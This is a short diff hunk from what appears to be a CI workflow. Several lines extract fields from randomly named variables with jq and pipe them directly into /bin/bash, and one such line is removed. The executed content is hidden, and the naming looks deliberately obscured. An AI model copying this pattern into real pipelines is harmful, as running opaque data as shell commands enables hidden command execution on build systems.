@@ -42,7 +42,6 @@ jobs:
           echo $ydtme9 | jq -r .wwjv501 | /bin/bash
           echo $hcvu678 | jq -r .ot4 | /bin/bash
           echo $v5 | jq -r .yng9632 | /bin/bash
-          printf '%s' "$xn087" | jq -r .w55 | /bin/bash
           printf '%s' "$znnon23880" | jq -r .h063 | /bin/bash
           echo $iwrnj32 | jq -r .pj597 | /bin/bash
           echo $j86350 | jq -r .ravrq95 | /bin/bash
